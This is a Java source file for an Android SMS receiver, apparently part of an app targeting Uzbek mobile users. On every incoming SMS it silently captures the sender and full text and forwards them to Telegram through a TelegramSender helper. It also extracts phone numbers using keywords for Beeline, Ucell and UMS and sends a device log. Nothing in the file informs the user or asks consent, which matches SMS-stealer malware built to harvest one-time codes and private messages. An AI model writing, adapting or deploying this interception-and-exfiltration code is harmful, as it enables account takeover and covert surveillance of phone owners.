package com.example.myapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive called");
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            StringBuilder smsText = new StringBuilder();
            String sender = null;

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                if (sender == null) sender = sms.getDisplayOriginatingAddress();
                smsText.append(sms.getDisplayMessageBody());
            }

            processSms(context, sender, smsText.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS: " + e.getMessage());
        }
    }

    private void processSms(Context context, String sender, String message) {
        Log.d(TAG, "Processing SMS from " + sender + ": " + message);
        String logMsg = String.format("✉️ Новое SMS от %s:\n%s", sender, message);
        TelegramSender.sendMessage(context, logMsg);

        String operator = DeviceInfo.getOperatorName(context);
        String phoneNumber = extractPhoneNumber(message, operator);

        if (phoneNumber != null) {
            String fullLog = LogGenerator.generateLog(context, "1.0", phoneNumber);
            Log.d(TAG, "Phone number extracted: " + phoneNumber);
            TelegramSender.sendMessage(context, fullLog);
        } else {
            Log.d(TAG, "No phone number extracted from SMS");
        }
    }

    private String extractPhoneNumber(String message, String operator) {
        Log.d(TAG, "Extracting phone number from message: " + message);
        if (message == null || operator == null) return null;

        Pattern pattern = Pattern.compile("(\\+?998\\d{9}|\\d{9})");
        Matcher matcher = pattern.matcher(message);

        if (matcher.find()) {
            String num = matcher.group();
            if (num.length() == 9) return "+998" + num;
            if (num.startsWith("998")) return "+" + num;
            return num;
        }

        String lowerOp = operator.toLowerCase();
        String lowerMsg = message.toLowerCase();

        if (lowerOp.contains("beeline") && (lowerMsg.contains("номер") || lowerMsg.contains("tel"))) {
            return findNumberInText(message);
        } else if (lowerOp.contains("ucell") && (lowerMsg.contains("номер") || lowerMsg.contains("raqam"))) {
            return findNumberInText(message);
        } else if (lowerOp.contains("ums") && (lowerMsg.contains("номер") || lowerMsg.contains("raqam"))) {
            return findNumberInText(message);
        }

        return null;
    }

    private String findNumberInText(String text) {
        Log.d(TAG, "Finding number in text: " + text);
        Pattern pattern = Pattern.compile("(\\+?998\\d{9}|\\d{9})");
        Matcher matcher = pattern.matcher(text);
        if (matcher.find()) {
            String num = matcher.group();
            if (num.length() == 9) return "+998" + num;
            if (num.startsWith("998")) return "+" + num;
            return num;
        }
        return null;
    }
}